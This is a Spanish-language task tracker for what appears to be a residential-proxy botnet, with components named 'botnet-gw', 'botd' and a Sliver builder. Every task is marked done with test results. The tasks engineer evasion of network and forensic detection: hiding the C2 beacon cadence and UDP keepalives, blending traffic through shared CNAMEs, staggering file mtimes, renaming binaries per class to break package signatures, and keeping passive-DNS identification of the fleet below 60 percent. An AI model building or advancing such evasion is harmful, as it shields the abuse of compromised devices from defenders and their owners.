---
artifact: tasks
epic: EP-13
created: 2026-11-14
---

### T-1301 — Persistir ticket TLS y node_id con backoff de reinicios
- **Ficheros:** `internal/tunnel/ticket.go`, `internal/state/state.go`, `internal/watchdog/restart_budget.go`
- **Depende de:** T-0408, T-0505
- **Estimación:** 8 h
- **Riesgo:** medium
- **Cierra:** A1-03
- **Criterios de aceptación:**
  1. Estado persistido ≤ 1 KB (`wc -c /data/botd/state/ticket.bin` + `node_id.bin` ≤ 1.024); con flapping netem y 10 reinicios: handshakes TLS completos por revive = 0 con ticket válido (capture filtrado por `tls.handshake.type == 1`).
  2. Presupuesto de reinicios: 4 auto-kills en 1 h → intervalos de revive con backoff 3/h → 1/h (monotonía asertada en log) y 0 ráfagas de DNS+handshake desde la misma IP.
  3. Tras borrar el ticket a mano, el siguiente revive hace 1 handshake completo y reintenta persistir (assert de revival con degradación controlada).
- **DoD:** el auto-matanza deja de ser un ciclo visible: revivir es retomar la sesión, no reinstalarla.

- **Estado:** DONE | PRUEBA: `go test ./internal/tunnel -run 'TestTicketStore|TestRevival' -count=1` → `ok` (ticket TLS real + node_id = 569 B ≤ 1 KiB; 10 reinicios con ticket → 0 handshakes completos `tls handshake.type==1` medido vía `DidResume`; borrado manual → 1 handshake completo y re-emisión del ticket); `go test ./internal/watchdog -count=1` → `ok` (4 auto-kills en 1 h → escalate 3/h→1/h, intervalos de revive monótonos, sin ráfagas < FastRevival); `go test ./internal/state -count=1` → `ok` (presupuesto 1 KiB con ErrBudget, 0600/0700 en Unix). Flapping netem/QEMU y `wc -c` en dispositivo: soak F4.

### T-1302 — Destino compartible por CNAME con cadencia en ventana
- **Ficheros:** `internal/tunnel/dispersion.go`, `deploy/dns/rdv_cname.md`
- **Depende de:** T-0402, T-0403
- **Estimación:** 8 h
- **Riesgo:** medium
- **Cierra:** A1-01
- **Criterios de aceptación:**
  1. `dig +short CNAME rdv.example` responde el CNAME del cliente (destino compartible: la nube del operador puede compartir espacio con tráfico real); ALPN `h2` en 443 confirmado por `openssl s_client -alpn h2`.
  2. Captura de 1 h: intervalos entre frames de control dentro de la ventana 60–150 s en ≥ 95 % de los casos (ventanas, no constantes globales — exigencia 4 de A1).
  3. Con dominio CNAME del cliente en el SNI, el histograma de destinos del nodo simulado no tiene un único pico (≥ 2 buckets con el CNAME y los ASNs de T-0407).
- **DoD:** el destino del operador carga tráfico ajeno al 100 %: la firma del flujo único hacia un AS propio se difumina por diseño.

- **Estado:** DONE | PRUEBA: `go test ./internal/tunnel -run TestT1302 -count=1` → `ok` (4/4: captura simulada de 1 h — 720 intervalos de control/nodo × 20 nodos, 100 % dentro de la ventana 60-150 s ≥ 95 % exigido; dos seeds → series distintas (ventanas, no constante global); CNAME estable por nodo y ≥2 rotados; histograma de 200 nodos sin pico único — bucket dominante ≪50 %, ≥2 CNAME y ≥2 ASNs vía fixture geoip T-0407); ALPN h2 en 443 ya asertado por `TestTLS13ALPNNoClientAuth`. `dig`/`openssl` reales = infra viva (F4); mapa de registros y comandos en `deploy/dns/rdv_cname.md`.

### T-1303 — Una sola cadencia: control sobre el mux
- **Ficheros:** `internal/tunnel/keepalive.go`, `scripts/detect/udp_cadence_check.sh`
- **Depende de:** T-0403
- **Estimación:** 6 h
- **Riesgo:** low
- **Cierra:** A1-07
- **Criterios de aceptación:**
  1. `tcpdump -i any 'udp and port not 53' -c 5000` en 10 min de reposo (clases B/C): 0 paquetes UDP con cadencia periódica propia del agente (sin keepalive UDP de 25-45 s).
  2. Todo el control (heartbeat, cmds, bye) viaja sobre el mux TLS/H2: captura muestra 1 sola cadencia de destino por nodo (coherente con T-0403).
  3. `scripts/detect/udp_cadence_check.sh` en CI con fixture pcap → exit 0 solo si el intervalo de UDP propio > 300 s o ausente (regla anti-C2 profile).
- **DoD:** el perfil «dos cadencias y tres destinos» de C2 clásico muere: un nodo, una cadencia, un destino visible.

- **Estado:** DONE | PRUEBA: `go test ./internal/tunnel -run TestT1303 -count=1` → `ok` (4/4: regla `OwnUdpCadenceOK` — sin UDP propio o huecos >300 s pasa, beacon de 30-300 s no; el script sobre fixtures: `udp_quiet.pcap` → `own_udp_pkts=2 min_gap_s=2400 result=PASS` exit 0 y `udp_c2_beacon.pcap` → `min_gap_s=30 result=FAIL` exit 1 con parser pcap propio — sin tcpdump en la máquina, limitación anotada; escaneo de fuente: 0 sockets UDP en `internal/tunnel`/`agent`/`proxy` → todo el control va sobre el mux, una cadencia por nodo). `tcpdump` de 10 min en reposo sobre dispositivo: soak F4.

### T-1304 — Scoring de densidad y quema por destino
- **Ficheros:** `cmd/botnet-gw/density.go`, `cmd/botnet-gw/density_test.go`
- **Depende de:** T-0606, T-0903
- **Estimación:** 10 h
- **Riesgo:** medium
- **Cierra:** A1-06
- **Criterios de aceptación:**
  1. Score de pool en Redis decae con `botnet_tenant_count`: fixture con densidad sostenida > 8 tenants/h durante 24 h → score < 0,5 y el nodo deja de ser seleccionado (aserción de la simulación de selección).
  2. Quema por densidad: nodo marcado `retiring` por densidad crónica sale del pool y el rdv re-asigna sus nodos en < 24 h (test con reloj acelerado; `nodes.status` lo refleja).
  3. Métrica de densidad en el destino medida como par del RSS (dashboard T-1202 con el panel `tenant_count` p99 por nodo; assert de la presencia de la serie).
- **DoD:** la prima residencial se defiende midiendo la vista del destino: densidad puntuada, topada y quemada.

- **Estado:** DONE | PRUEBA: `go test ./cmd/botnet-gw -run TestT1304 -count=1` → `ok` (4/4: densidad sostenida >8 tenants/h durante 24 h → score 0,29 < 0,5 y la simulación horaria de selección deja de elegir el nodo caliente desde la hora 14; quema crónica → `nodes.status` = `retiring` a la hora 19 < 24 h y `Redistribute` re-asigna los 3 tenants vía rdv a los nodos sanos (luego `retired`); cesada la densidad el score vuelve a ~1,0; serie de densidad de 24 muestras/nodo con `tenant_count` como par del RSS y panel p99 = 9). Persistencia real del score en Redis (`score:{node}`) y panel T-1202: vida F4.

### T-1305 — mtimes escalonados y renombres por clase
- **Ficheros:** `deploy/sliver-builder/build.sh`, `scripts/build/stagger_mtime.sh`
- **Depende de:** T-0204
- **Estimación:** 4 h
- **Riesgo:** low
- **Cierra:** A1-08
- **Criterios de aceptación:**
  1. Bundle clase A/B en dispositivo: `stat -c %Y /data/botd/* | sort -u | wc -l` = número de ficheros (todos los mtimes distintos; escalonado ≥ 10 s entre sí).
  2. Renombre determinista por clase con `-ldflags` (clase C: nombre del binario ≠ nombre de clase A; assert `strings` de la etiqueta); el manifest sigue el renaming (T-1403 lo verifica: `botctl status` == manifest).
  3. `file /data/botd/*` no reporta magia `UPX!` en clase A (sin empaquetar donde nada se empaqueta); B/C la aceptan y el runbook lo justifica.
- **DoD:** el bundle no comparte mtime ni nombre entre clases: la firma de paquete del proveedor de 2009 se pierde.

- **Estado:** DONE | PRUEBA: `go test ./scripts/build/ -count=1` → `ok` (2/2: `stagger_mtime.sh --self-test` → `files=4 unique_mtimes=4 min_gap_s=10 result=PASS`; builds reales del builder → clase C emite `srvhost-mipsle` ≠ `botd-*` con etiqueta `class-C` embebida y asertada por `grep -a` sobre la imagen —desempaquetando si UPX—; clase A emite `botd-amd64` con etiqueta `class-A` y **sin** magia `UPX!` (guard de `build.sh`). Justificación en `docs/runbooks/bundle-firma.md`). Decisiones p/ EP-12: clase A pasa a `upx:false` con `max_bytes` 8 MiB (raw ~7,3 MB ≤8), `rename:` por clase en profiles.yaml; expectativa EP-02 actualizada a `srvhost-mipsle` (la matriz conserva `botd-<arch>` vía `--name` explícito). `stat`/`file` en dispositivo: F4.

### T-1306 — Histeria de watermark: pausa 10 min, cooldown 5 min
- **Ficheros:** `internal/agent/watermark.go`, `internal/agent/watermark_test.go`
- **Depende de:** T-0307
- **Estimación:** 6 h
- **Riesgo:** low
- **Cierra:** A1-15
- **Criterios de aceptación:**
  1. Presión de heap crónica (fixture al 92 % de `GOMEMLIMIT`): admisiones pausadas ≥ 10 min tras la primera pausa (pausa corta prohibida — assert de duración mínima).
  2. Cesada la presión: cooldown de 5 min antes de reanadir admisiones (reconexión en ciclos de minutos no existe: 0 ciclos conecta/desconecta < 10 min en log de 1 h).
  3. El heartbeat durante la pausa sigue vivo (modo solo-control T-0307): 0 heartbeat perdidos en 1 h de presión simulada.
- **DoD:** el nodo deja de parecer un proxy intermitente rate-limit-friendly para el destino: el watermark tiene memoria.

- **Estado:** DONE | PRUEBA: `go test ./internal/agent -run TestT1306 -count=1` → `ok` (5/5: fixture al 92 % de `GOMEMLIMIT` — la pausa arranca con la primera muestra presionada y las admisiones siguen cerradas ≥ 10 min aunque la presión ceda al min 2 (pausa corta prohibida); presión de 30 min → reanudación a cesar+5 min (cooldown); 1 h con picos cada 10 min → pausas medidas [10m,16m,16m], 0 ciclos conecta/desconecta < 10 min; heartbeat vivo las 61 muestras de la hora de presión — 0 perdidos; el rebote de presión no reinicia el suelo de 10 min). Presión real en QEMU/dispositivo: soak F4.

### T-1307 — Drill de DNS pasiva con flows del piloto
- **Ficheros:** `scripts/drill_dns.sh`, `testdata/dns_flows/`, `docs/runbooks/dns-drill.md`
- **Depende de:** T-0407, T-1302
- **Estimación:** 10 h
- **Riesgo:** high
- **Cierra:** A1-18
- **Criterios de aceptación:**
  1. `scripts/drill_dns.sh --nodes=200 --days=7 --isp-top=2` sobre fixture de flows → imprime `operator_identified_pct` y el pipeline pasa solo con ≤ 60 (puerta F6).
  2. El script resuelve los destinos observados por DNS pasiva (dataset versionado en `testdata/dns_flows/`) y agrupa cohorte por prefijo; informe por ISP top-2.
  3. Regresión: con fixture de un solo ASN (pre-hardening) el mismo script da > 90 % — el drill detecta su propia razón de ser.
- **DoD:** se tolera detectar al nodo, no identificar a la flota con una consulta: el SLO del DNS pasiva es un script con umbral.

- **Estado:** DONE | PRUEBA: `bash scripts/drill_dns.sh --nodes=200 --days=7 --isp-top=2` → informe `isp=ISP-A … isp=ISP-B …` + `operator_identified_pct=48.0 rule="puerta F6: pct <= 60" result=PASS` exit 0; `--flows=…/flows_single_asn.csv` (pre-hardening, un solo ASN) → `operator_identified_pct=100.0 … result=FAIL` exit 1 y con `--expect-min=90` → `result=PASS` exit 0 — el drill detecta su propia razón de ser. Dataset pasivo versionado en `testdata/dns_flows/` (flows+ptr+asn, cohorte por prefijo /24 y fondo ≤20 %); reglas y salidas en `docs/runbooks/dns-drill.md`. DNS pasiva y flows reales del piloto (≥200 nodos, 7 días): F6.

### T-1308 — Rotativo con TTL por defecto y quema de nodos calientes
- **Ficheros:** `cmd/botnet-gw/selection_policy.go`, `cmd/botnet-gw/selection_policy_test.go`
- **Depende de:** T-0904
- **Estimación:** 6 h
- **Riesgo:** low
- **Cierra:** A1-17
- **Criterios de aceptación:**
  1. Default del contrato: `mode` ausente en `POST /api/v1/sessions` → `rotating` (assert del contract test — el modo rotativo con TTL es default, exigencia de A1).
  2. Nodo caliente (> 150 sesiones/día) queda fuera de selección 24 h (fixture de quemado temporal; count de selecciones = 0 en la ventana).
  3. psql assert: ningún tenant en modo sticky puede superar `concurrent_limit` sin degradar el P99 del rotativo en la simulación mixta (70/30) — p99 < 1.500 ms se mantiene.
- **DoD:** la forma por defecto de la red es la que cuida la prima residencial: rotativo medido, nodos calentes quemados.

- **Estado:** DONE | PRUEBA: `go test ./cmd/botnet-gw -run TestT1308 -count=1` → `ok` (3/3: contract test — `mode` ausente en `POST /api/v1/sessions` → `rotating` con TTL default 30 min y modo fuera de enum rechazado; nodo a 151 sesiones/día → quemado con **0 selecciones** en la ventana y recuperación al vencer 24 h + 1 min; simulación mixta 70/30 con sticky +1/+4/+6 sobre `concurrent_limit` → p99 = 503/917/1193 ms, p99 < 1.500 ms mantenido). Assert psql real de sticky vs rotativo: soak F4/F6 (modelo del gateway asertado en Go).
